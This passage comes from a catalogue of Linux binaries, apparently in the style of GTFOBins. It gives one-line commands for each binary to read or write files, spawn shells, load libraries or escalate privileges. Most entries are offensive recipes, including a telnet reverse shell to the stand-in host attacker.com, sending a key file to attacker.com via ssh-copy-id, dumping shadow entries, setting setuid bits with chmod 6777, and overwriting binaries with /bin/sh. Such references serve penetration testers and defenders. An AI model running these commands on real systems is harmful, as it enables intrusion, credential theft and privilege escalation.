Linux binary 'pdflatex' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
pdftotext texput.pdf -
```

#### pg
Linux binary 'pg' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
pg /path/to/input-file
```

#### pic
Linux binary 'pic' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
pic /path/to/input-file
```

#### pr
Linux binary 'pr' with exploitation functions: file-read
**Categories:** file-read
```
pr -T /path/to/input-file
```

#### ptx
Linux binary 'ptx' with exploitation functions: file-read
**Categories:** file-read
```
ptx -w 999 /path/to/input-file
```

#### puppet
Linux binary 'puppet' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
puppet filebucket -l diff /dev/null /path/to/input-file
```

#### pygmentize
Linux binary 'pygmentize' with exploitation functions: file-read
**Categories:** file-read
```
pygmentize -l text /path/to/input-file
```

#### pyright
Linux binary 'pyright' with exploitation functions: file-read
**Categories:** file-read
```
pyright /path/to/input-file
```

#### qpdf
Linux binary 'qpdf' with exploitation functions: file-read
**Categories:** file-read
```
qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file
```

#### rake
Linux binary 'rake' with exploitation functions: file-read, inherit
**Categories:** file-read, inherit
```
rake -f /path/to/input-file
```

#### readelf
Linux binary 'readelf' with exploitation functions: file-read
**Categories:** file-read
```
readelf -a @/path/to/input-file
```

#### redcarpet
Linux binary 'redcarpet' with exploitation functions: file-read
**Categories:** file-read
```
redcarpet /path/to/input-file
```

#### rev
Linux binary 'rev' with exploitation functions: file-read
**Categories:** file-read
```
rev /path/to/input-file | rev
```

#### rustc
Linux binary 'rustc' with exploitation functions: file-read, file-write, inherit
**Categories:** file-read, file-write, inherit
```
rustc /path/to/input-file
```

#### rustdoc
Linux binary 'rustdoc' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
rustdoc /path/to/input-file
```

#### rustfmt
Linux binary 'rustfmt' with exploitation functions: file-read
**Categories:** file-read
```
rustfmt /path/to/input-file
```

#### sed
Linux binary 'sed' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
sed '' /path/to/input-file
```

#### shuf
Linux binary 'shuf' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
shuf -z /path/to/input-file
```

#### soelim
Linux binary 'soelim' with exploitation functions: file-read
**Categories:** file-read
```
soelim /path/to/input-file
```

#### sort
Linux binary 'sort' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
sort -m /path/to/input-file
```

#### split
Linux binary 'split' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
split -b 999 --additional-suffix suffix /path/to/input-file prefix
cat prefixaasuffix
```

#### sqlite3
Linux binary 'sqlite3' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
sqlite3 <<EOF
CREATE TABLE x(x TEXT);
.import /path/to/input-file x
SELECT * FROM x;
EOF
```

#### ss
Linux binary 'ss' with exploitation functions: file-read
**Categories:** file-read
```
ss -a -F /path/to/input-file
```

#### ssh-copy-id
Linux binary 'ssh-copy-id' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
```

#### ssh-keyscan
Linux binary 'ssh-keyscan' with exploitation functions: file-read
**Categories:** file-read
```
ssh-keyscan -f /path/to/input-file
```

#### strings
Linux binary 'strings' with exploitation functions: file-read
**Categories:** file-read
```
strings /path/to/input-file
```

#### tac
Linux binary 'tac' with exploitation functions: file-read
**Categories:** file-read
```
tac -s 'RANDOM' /path/to/input-file
```

#### tail
Linux binary 'tail' with exploitation functions: file-read
**Categories:** file-read
```
tail -c+0 /path/to/input-file
```

#### tbl
Linux binary 'tbl' with exploitation functions: file-read
**Categories:** file-read
```
tbl /path/to/input-file
```

#### terraform
Linux binary 'terraform' with exploitation functions: file-read
**Categories:** file-read
```
terraform console
file("/path/to/input-file")
```

#### tic
Linux binary 'tic' with exploitation functions: file-read
**Categories:** file-read
```
tic -C /path/to/input-file
```

#### tmux
Linux binary 'tmux' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
tmux -f /path/to/input-file
```

#### troff
Linux binary 'troff' with exploitation functions: file-read
**Categories:** file-read
```
troff /path/to/input-file
```

#### tsc
Linux binary 'tsc' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
tsc /path/to/input-file.ts
```

#### ul
Linux binary 'ul' with exploitation functions: file-read
**Categories:** file-read
```
ul /path/to/input-file
```

#### unexpand
Linux binary 'unexpand' with exploitation functions: file-read
**Categories:** file-read
```
unexpand -t999 /path/to/input-file
```

#### uniq
Linux binary 'uniq' with exploitation functions: file-read
**Categories:** file-read
```
uniq /path/to/input-file
```

#### urlget
Linux binary 'urlget' with exploitation functions: file-read
**Categories:** file-read
```
urlget - /path/to/input-file
```

#### uuencode
Linux binary 'uuencode' with exploitation functions: file-read
**Categories:** file-read
```
uuencode /path/to/input-file /dev/stdout | uudecode
```

#### vi
Linux binary 'vi' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
vi /path/to/input-file
```

#### vim
Linux binary 'vim' with exploitation functions: file-read, inherit
**Categories:** file-read, inherit
```
vim -c ':redir! >/path/to/output-file | echo "DATA" | redir END | q'
```

#### w3m
Linux binary 'w3m' with exploitation functions: file-read
**Categories:** file-read
```
w3m -dump /path/to/input-file
```

#### wall
Linux binary 'wall' with exploitation functions: file-read
**Categories:** file-read
```
wall --nobanner /path/to/input-file
```

#### wc
Linux binary 'wc' with exploitation functions: file-read
**Categories:** file-read
```
wc --files0-from /path/to/input-file
```

#### whiptail
Linux binary 'whiptail' with exploitation functions: file-read
**Categories:** file-read
```
whiptail --textbox --scrolltext /path/to/input-file 0 0
```

#### xargs
Linux binary 'xargs' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
xargs -a /path/to/input-file -0
```

#### xmodmap
Linux binary 'xmodmap' with exploitation functions: file-read
**Categories:** file-read
```
xmodmap -v /path/to/input-file
```

#### xmore
Linux binary 'xmore' with exploitation functions: file-read
**Categories:** file-read
```
xmore /path/to/input-file
```

#### xpad
Linux binary 'xpad' with exploitation functions: file-read
**Categories:** file-read
```
xpad -f /path/to/input-file
```

#### xxd
Linux binary 'xxd' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
xxd /path/to/input-file | xxd -r
```

#### xz
Linux binary 'xz' with exploitation functions: file-read
**Categories:** file-read
```
xz -c /path/to/input-file | xz -d
```

#### yelp
Linux binary 'yelp' with exploitation functions: file-read
**Categories:** file-read
```
yelp man:/path/to/input-file
```

#### zcat
Linux binary 'zcat' with exploitation functions: file-read
**Categories:** file-read
```
zcat -f /path/to/input-file
```

#### zgrep
Linux binary 'zgrep' with exploitation functions: file-read
**Categories:** file-read
```
grep '' /path/to/input-file
```

#### zip
Linux binary 'zip' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
zip /path/to/temp-file /path/to/input-file
unzip -p /path/to/temp-file
```

#### zsoelim
Linux binary 'zsoelim' with exploitation functions: file-read
**Categories:** file-read
```
zsoelim /path/to/input-file
```

### file-write

#### ash
Linux binary 'ash' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
ash -c 'echo DATA >/path/to/output-file'
```

#### csh
Linux binary 'csh' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
csh -c 'echo DATA >/path/to/output-file'
```

#### dash
Linux binary 'dash' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
dash -c 'echo DATA >/path/to/output-file'
```

#### dmidecode
Linux binary 'dmidecode' with exploitation functions: file-write
**Categories:** file-write
```
dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file
```

#### gdb
Linux binary 'gdb' with exploitation functions: file-write, inherit, shell
**Categories:** file-write, inherit, shell
```
gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
```

#### gtester
Linux binary 'gtester' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
gtester DATA -o /path/to/output-file
```

#### hashcat
Linux binary 'hashcat' with exploitation functions: file-write
**Categories:** file-write
```
echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash
hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist
```

#### iptables-save
Linux binary 'iptables-save' with exploitation functions: file-write
**Categories:** file-write
```
iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
iptables -S
iptables-save -f /path/to/output-file
```

#### mv
Linux binary 'mv' with exploitation functions: file-write, privilege-escalation
**Categories:** file-write, privilege-escalation
```
echo DATA >/path/to/temp-file
mv /path/to/temp-file /path/to/output-file
```

#### pwsh
Linux binary 'pwsh' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
pwsh -c '"DATA" | Out-File /path/to/output-file'
```

#### redis
Linux binary 'redis' with exploitation functions: file-write
**Categories:** file-write
```
redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x "DATA"
save
```

#### rlwrap
Linux binary 'rlwrap' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
rlwrap -l /path/to/output-file echo DATA
```

#### screen
Linux binary 'screen' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
screen -L -Logfile /path/to/output-file echo DATA
```

#### script
Linux binary 'script' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
script -q -c '# DATA' /path/to/output-file
```

#### shred
Linux binary 'shred' with exploitation functions: file-write
**Categories:** file-write
```
shred -u /path/to/output-file
```

#### strace
Linux binary 'strace' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
strace -s 999 -o /path/to/output-file strace - DATA
```

#### tcsh
Linux binary 'tcsh' with exploitation functions: file-write, shell
**Categories:** file-write, shell
```
tcsh -c 'echo DATA >/path/to/output-file'
```

#### tee
Linux binary 'tee' with exploitation functions: file-write
**Categories:** file-write
```
echo DATA | tee /path/to/output-file
```

#### update-alternatives
Linux binary 'update-alternatives' with exploitation functions: file-write
**Categories:** file-write
```
echo DATA >/path/to/temp-file
update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0
```

#### varnishncsa
Linux binary 'varnishncsa' with exploitation functions: file-write
**Categories:** file-write
```
varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
```

#### wireshark
Linux binary 'wireshark' with exploitation functions: file-write, inherit
**Categories:** file-write, inherit
```
wireshark -c 1 -i lo -k -f 'udp port 12345' &
echo DATA | nc -u 127.127.127.127 12345
```

### inherit

#### apport-cli
Linux binary 'apport-cli' with exploitation functions: inherit
**Categories:** inherit
```
apport-cli -f
1
2
v
```

#### apt-get
Linux binary 'apt-get' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
apt-get changelog apt
```

#### aptitude
Linux binary 'aptitude' with exploitation functions: inherit
**Categories:** inherit
```
aptitude changelog aptitude
```

#### bashbug
Linux binary 'bashbug' with exploitation functions: inherit
**Categories:** inherit
```
bashbug
```

#### batcat
Linux binary 'batcat' with exploitation functions: inherit
**Categories:** inherit
```
batcat --paging always /etc/hosts
```

#### bee
Linux binary 'bee' with exploitation functions: inherit
**Categories:** inherit
```
bee eval '...'
```

#### bundle
Linux binary 'bundle' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
bundle help
```

#### busctl
Linux binary 'busctl' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
busctl --show-machine
```

#### busybox
Linux binary 'busybox' with exploitation functions: inherit, reverse-shell, upload
**Categories:** inherit, reverse-shell, upload
```
busybox ash
```

#### byebug
Linux binary 'byebug' with exploitation functions: inherit
**Categories:** inherit
```
byebug --no-stop /path/to/script.rb
```

#### cargo
Linux binary 'cargo' with exploitation functions: inherit
**Categories:** inherit
```
cargo help doc
```

#### cowsay
Linux binary 'cowsay' with exploitation functions: inherit
**Categories:** inherit
```
cowsay -f /path/to/script.pl x
```

#### cowthink
Linux binary 'cowthink' with exploitation functions: inherit
**Categories:** inherit
```
cowthink -f /path/to/script.pl x
```

#### cpan
Linux binary 'cpan' with exploitation functions: inherit
**Categories:** inherit
```
cpan
! ...
```

#### dpkg
Linux binary 'dpkg' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
dpkg -l
```

#### dstat
Linux binary 'dstat' with exploitation functions: inherit
**Categories:** inherit
```
dstat --xxx
```

#### easy_install
Linux binary 'easy_install' with exploitation functions: inherit
**Categories:** inherit
```
echo '...' >setup.py
easy_install .
```

#### eb
Linux binary 'eb' with exploitation functions: inherit
**Categories:** inherit
```
eb logs
```

#### ex
Linux binary 'ex' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
ex
```

#### facter
Linux binary 'facter' with exploitation functions: inherit
**Categories:** inherit
```
FACTERLIB=/path/to/dir/ facter
```

#### gcloud
Linux binary 'gcloud' with exploitation functions: inherit
**Categories:** inherit
```
gcloud help
```

#### gem
Linux binary 'gem' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
gem open debug
```

#### gimp
Linux binary 'gimp' with exploitation functions: inherit
**Categories:** inherit
```
gimp -idf --batch-interpreter=python-fu-eval -b '...'
```

#### irb
Linux binary 'irb' with exploitation functions: inherit
**Categories:** inherit
```
irb
...
```

#### journalctl
Linux binary 'journalctl' with exploitation functions: inherit
**Categories:** inherit
```
journalctl
```

#### knife
Linux binary 'knife' with exploitation functions: inherit
**Categories:** inherit
```
knife exec -E '...'
```

#### lualatex
Linux binary 'lualatex' with exploitation functions: inherit
**Categories:** inherit
```
lualatex -shell-escape '\directlua{...}\end'
```

#### luatex
Linux binary 'luatex' with exploitation functions: inherit
**Categories:** inherit
```
luatex -shell-escape '\directlua{...}\end'
```

#### msfconsole
Linux binary 'msfconsole' with exploitation functions: inherit
**Categories:** inherit
```
msfconsole
irb
```

#### needrestart
Linux binary 'needrestart' with exploitation functions: inherit
**Categories:** inherit
```
echo '...' >/path/to/temp-file
needrestart -c /path/to/temp-file
```

#### pdb
Linux binary 'pdb' with exploitation functions: inherit
**Categories:** inherit
```
echo '...' >/path/to/temp-file
pdb /path/to/temp-file
cont
```

#### pip
Linux binary 'pip' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
echo '...' >setup.py
pip install --break-system-packages .
```

#### pipx
Linux binary 'pipx' with exploitation functions: inherit
**Categories:** inherit
```
echo '...' >/path/to/file.py
pipx run /path/to/file.py
```

#### poetry
Linux binary 'poetry' with exploitation functions: inherit
**Categories:** inherit
```
echo '...' >/path/to/temp-file
poetry run python /path/to/temp-file
```

#### pry
Linux binary 'pry' with exploitation functions: inherit
**Categories:** inherit
```
pry
```

#### psql
Linux binary 'psql' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
psql
\?
```

#### rpmdb
Linux binary 'rpmdb' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
rpmdb --eval '%{lua:...}'
```

#### rpmquery
Linux binary 'rpmquery' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
rpmquery --eval '%{lua:...}'
```

#### rpmverify
Linux binary 'rpmverify' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
rpmverify --eval '%{lua:...}'
```

#### run-mailcap
Linux binary 'run-mailcap' with exploitation functions: inherit
**Categories:** inherit
```
run-mailcap --action=view text/plain:/etc/hosts
```

#### sqlmap
Linux binary 'sqlmap' with exploitation functions: inherit
**Categories:** inherit
```
sqlmap -u 127.0.0.1 --eval='...'
```

#### systemctl
Linux binary 'systemctl' with exploitation functions: inherit, shell
**Categories:** inherit, shell
```
systemctl
```

#### systemd-resolve
Linux binary 'systemd-resolve' with exploitation functions: inherit
**Categories:** inherit
```
systemd-resolve --status
```

#### timedatectl
Linux binary 'timedatectl' with exploitation functions: inherit
**Categories:** inherit
```
timedatectl list-timezones
```

#### tshark
Linux binary 'tshark' with exploitation functions: inherit
**Categories:** inherit
```
echo '...' >/path/to/temp-file
tshark -Xlua_script:/path/to/temp-file
```

#### vagrant
Linux binary 'vagrant' with exploitation functions: inherit
**Categories:** inherit
```
echo '...' >Vagrantfile
vagrant up
```

#### vigr
Linux binary 'vigr' with exploitation functions: inherit
**Categories:** inherit
```
vigr
```

#### vipw
Linux binary 'vipw' with exploitation functions: inherit
**Categories:** inherit
```
vipw
```

#### volatility
Linux binary 'volatility' with exploitation functions: inherit
**Categories:** inherit
```
volatility -f /path/to/core-dump volshell
...
```

#### wish
Linux binary 'wish' with exploitation functions: inherit
**Categories:** inherit
```
wish
```

#### zless
Linux binary 'zless' with exploitation functions: inherit
**Categories:** inherit
```
zless /path/to/input-file
```

### library-load

#### ffmpeg
Linux binary 'ffmpeg' with exploitation functions: library-load
**Categories:** library-load
```
ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
reset^J
```

#### ldconfig
Linux binary 'ldconfig' with exploitation functions: library-load
**Categories:** library-load
```
echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping
```

#### mysql
Linux binary 'mysql' with exploitation functions: library-load, shell
**Categories:** library-load, shell
```
mysql --default-auth ../../../../../path/to/lib
```

#### ssh-keygen
Linux binary 'ssh-keygen' with exploitation functions: library-load
**Categories:** library-load
```
ssh-keygen -D /path/to/lib.so
```

#### tclsh
Linux binary 'tclsh' with exploitation functions: library-load, reverse-shell, shell
**Categories:** library-load, reverse-shell, shell
```
tclsh
load /path/to/lib.so x
```

### privilege-escalation

#### chattr
Linux binary 'chattr' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
chattr +i /path/to/input-file
```

#### chmod
Linux binary 'chmod' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
chmod 6777 /path/to/input-file
```

#### chown
Linux binary 'chown' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
chown $(id -un):$(id -gn) /path/to/input-file
```

#### getent
Linux binary 'getent' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
getent shadow
```

#### install
Linux binary 'install' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
install -m 6777 /path/to/input-file /path/to/output-dir/
```

#### ln
Linux binary 'ln' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
ln -fs /bin/sh /bin/ln
ln
```

#### mount
Linux binary 'mount' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
mount -o bind /bin/sh /bin/mount
mount
```

#### passwd
Linux binary 'passwd' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
echo -e 'x\nx' | passwd
```

#### setcap
Linux binary 'setcap' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
setcap cap_setuid+ep /path/to/command
```

#### setfacl
Linux binary 'setfacl' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
setfacl -m u:$(id -un):rwx /path/to/input-file
```

#### unsquashfs
Linux binary 'unsquashfs' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
unsquashfs shell
./squashfs-root/sh -p
```

#### unzip
Linux binary 'unzip' with exploitation functions: privilege-escalation
**Categories:** privilege-escalation
```
unzip -K shell.zip
./sh -p
```

### reverse-shell

#### telnet
Linux binary 'telnet' with exploitation functions: reverse-shell, shell
**Categories:** reverse-shell, shell
```
mkfifo /path/to/temp-socket
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
```

### shell

#### aa-exec
Linux binary 'aa-exec' with exploitation functions: shell
**Categories:** shell
```
aa-exec /bin/sh
```

#### agetty
Linux binary 'agetty' with exploitation functions: shell
**Categories:** shell
```
agetty -l /bin/sh -o -p -a root tty
```

#### ansible-playbook
Linux binary 'ansible-playbook' with exploitation functions: shell
**Categories:** shell
```
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file
ansible-playbook /path/to/temp-file
```

#### ansible-test
Linux binary 'ansible-test' with exploitation functions: shell
**Categories:** shell
```
ansible-test shell
```

#### aoss
Linux binary 'aoss' with exploitation functions: shell
**Categories:** shell
```
aoss /bin/sh
```

#### arch-nspawn
Linux binary 'arch-nspawn' with exploitation functions: shell
**Categories:** shell
```
mkdir -p ./etc/
grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
arch-nspawn .
```

#### asterisk
Linux binary 'asterisk' with exploitation functions: shell
**Categories:** shell
```
asterisk -r
!/bin/sh
```

#### autoconf
Linux binary 'autoconf' with exploitation functions: shell
**Categories:** shell
```
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoconf
```

#### autoheader
Linux binary 'autoheader' with exploitation functions: shell
**Categories:** shell
```
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoheader
```

#### autoreconf
Linux binary 'autoreconf' with exploitation functions: shell
**Categories:** shell
```
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
echo AC_INIT >configure.ac
AUTOM4TE=/path/to/temp-file autoreconf
```

#### borg
Linux binary 'borg' with exploitation functions: shell
**Categories:** shell
```
borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
```

#### bpftrace
Linux binary 'bpftrace' with exploitation functions: shell
**Categories:** shell
```
bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
```

#### cabal
Linux binary 'cabal' with exploitation functions: shell
**Categories:** shell
```
cabal exec --project-file=/dev/null -- /bin/sh
```

#### capsh
Linux binary 'capsh' with exploitation functions: shell
**Categories:** shell
```
capsh --
```

#### cdist
Linux binary 'cdist' with exploitation functions: shell
**Categories:** shell
```
cdist shell -s /bin/sh
```

#### certbot
Linux binary 'certbot' with exploitation functions: shell
**Categories:** shell
```
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
```

#### check_by_ssh
Linux binary 'check_by_ssh' with exploitation functions: shell
**Categories:** shell
```
check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
```

#### check_ssl_cert
Linux binary 'check_ssl_cert' with exploitation functions: shell
**Categories:** shell
```
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
check_ssl_cert --grep-bin /path/to/temp-file -H x
```

#### choom
Linux binary 'choom' with exploitation functions: shell
**Categories:** shell
```
choom -n 0 /bin/sh
```

#### chroot
Linux binary 'chroot' with exploitation functions: shell
**Categories:** shell
```
chroot /
```

#### chrt
Linux binary 'chrt' with exploitation functions: shell
**Categories:** shell
```
chrt 1 /bin/sh
```

#### clisp
Linux binary 'clisp' with exploitation functions: shell
**Categories:** shell
```
clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
```

#### cobc
Linux binary 'cobc' with exploitation functions: shell
**Categories:** shell
```
echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file
```

#### codex
Linux binary 'codex' with exploitation functions: shell
**Categories:** shell
```
codex sandbox linux /bin/sh
```

#### composer
Linux binary 'composer' with exploitation functions: shell
**Categories:** shell
```
echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
composer run-script x
```

#### cpulimit
Linux binary 'cpulimit' with exploitation functions: shell
**Categories:** shell
```
cpulimit -l 100 -f /bin/sh
```

#### ctr
Linux binary 'ctr' with exploitation functions: shell
**Categories:** shell
```
ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
```

#### dc
Linux binary 'dc' with exploitation functions: shell
**Categories:** shell
```
dc -e '!/bin/sh'
```

#### debugfs
Linux binary 'debugfs' with exploitation functions: shell
**Categories:** shell
```
debugfs
!/bin/sh
```

#### dhclient
Linux binary 'dhclient' with exploitation functions: shell
**Categories:** shell
```
dhclient -sf /bin/sh
```

#### distcc
Linux binary 'distcc' with exploitation functions: shell
**Categories:** shell
```
distcc /bin/sh
```

#### dmsetup
Linux binary 'dmsetup' with exploitation functions: shell
**Categories:** shell
```
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'
```

#### doas
Linux binary 'doas' with exploitation functions: shell
**Categories:** shell
```
doas -u root /bin/sh
```

#### dvips
Linux binary 'dvips' with exploitation functions: shell
**Categories:** shell
```
dvips -R0 texput.dvi
```

#### easyrsa
Linux binary 'easyrsa' with exploitation functions: shell
**Categories:** shell
```
echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file
```

#### enscript
Linux binary 'enscript' with exploitation functions: shell
**Categories:** shell
```
enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
```

#### env
Linux binary 'env' with exploitation functions: shell
**Categories:** shell
```
env /bin/sh
```

#### firejail
Linux binary 'firejail' with exploitation functions: shell
**Categories:** shell
```
firejail /bin/sh
```

#### fish
Linux binary 'fish' with exploitation functions: shell
**Categories:** shell
```
fish
```

#### flock
Linux binary 'flock' with exploitation functions: shell
**Categories:** shell
```
flock -u / /bin/sh
```

#### forge
Linux binary 'forge' with exploitation functions: shell
**Categories:** shell
```
echo '#!/bin/sh' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file
```

#### genie
Linux binary 'genie' with exploitation functions: shell
**Categories:** shell
```
genie -c '/bin/sh'
```

#### ghc
Linux binary 'ghc' with exploitation functions: shell
**Categories:** shell
```
ghc -e 'System.Process.callCommand "/bin/sh"'
```

#### ghci
Linux binary 'ghci' with exploitation functions: shell
**Categories:** shell
```
ghci
System.Process.callCommand "/bin/sh"
```

#### ginsh
Linux binary 'ginsh' with exploitation functions: shell
**Categories:** shell
```
ginsh
!/bin/sh
```

#### gnuplot
Linux binary 'gnuplot' with exploitation functions: shell
**Categories:** shell
```
gnuplot -e 'system("/bin/sh 1>&0")'
```

#### grc
Linux binary 'grc' with exploitation functions: shell
**Categories:** shell
```
grc --pty /bin/sh
```

#### guile
Linux binary 'guile' with exploitation functions: shell
**Categories:** shell
```
guile -c '(system "/bin/sh")'
```

#### hg
Linux binary 'hg' with exploitation functions: shell
**Categories:** shell
```
hg --config alias.x='!/bin/sh' x
```

#### hping3
Linux binary 'hping3' with exploitation functions: shell, upload
**Categories:** shell, upload
```
hping3
/bin/sh
```

#### iftop
Linux binary 'iftop' with exploitation functions: shell
**Categories:** shell
```
iftop
!/bin/sh
```

#### ionice
Linux binary 'ionice' with exploitation functions: shell
**Categories:** shell
```
ionice /bin/sh
```

#### ispell
Linux binary 'ispell' with exploitation functions: shell
**Categories:** shell
```
ispell /etc/hosts
!/bin/sh
```

#### java
Linux binary 'java' with exploitation functions: shell
**Categories:** shell
```
java Shell
```

#### joe
Linux binary 'joe' with exploitation functions: shell
**Categories:** shell
```
joe
^K!/bin/sh
```

#### jtag
Linux binary 'jtag' with exploitation functions: shell
**Categories:** shell
```
jtag --interactive
shell /bin/sh
```

#### ksu
Linux binary 'ksu' with exploitation functions: shell
**Categories:** shell
```
ksu -q -e /bin/sh
```

#### kubectl
Linux binary 'kubectl' with exploitation functions: shell, upload
**Categories:** shell, upload
```
cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=/path/to/temp-file
```

#### ld
Linux binary 'ld' with exploitation functions: shell
**Categories:** shell
```
/path/to/ld.so /bin/sh
```

#### lftp
Linux binary 'lftp' with exploitation functions: shell
**Categories:** shell
```
lftp -c '!/bin/sh'
```

#### loginctl
Linux binary 'loginctl' with exploitation functions: shell
**Categories:** shell
```
loginctl user-status
!/bin/sh
```

#### logsave
Linux binary 'logsave' with exploitation functions: shell
**Categories:** shell
```
logsave /dev/null /bin/sh -i
```

#### lxd
Linux binary 'lxd' with exploitation functions: shell
**Categories:** shell
```
lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

#### mail
Linux binary 'mail' with exploitation functions: shell
**Categories:** shell
```
mail --exec='!/bin/sh'
```

#### minicom
Linux binary 'minicom' with exploitation functions: shell
**Categories:** shell
```
minicom -D /dev/null
```

#### mosh-server
Linux binary 'mosh-server' with exploitation functions: shell
**Categories:** shell
```
mosh --server=mosh-server localhost /bin/sh
```

#### multitime
Linux binary 'multitime' with exploitation functions: shell
**Categories:** shell
```
multitime /bin/sh
```

#### ncdu
Linux binary 'ncdu' with exploitation functions: shell
**Categories:** shell
```
ncdu
b
```

#### ncftp
Linux binary 'ncftp' with exploitation functions: shell
**Categories:** shell
```
ncftp
!/bin/sh
```

#### nice
Linux binary 'nice' with exploitation functions: shell
**Categories:** shell
```
nice /bin/sh
```

#### npm
Linux binary 'npm' with exploitation functions: shell
**Categories:** shell
```
npm exec /bin/sh
```

#### nsenter
Linux binary 'nsenter' with exploitation functions: shell
**Categories:** shell
```
nsenter /bin/sh
```

#### opkg
Linux binary 'opkg' with exploitation functions: shell
**Categories:** shell
```
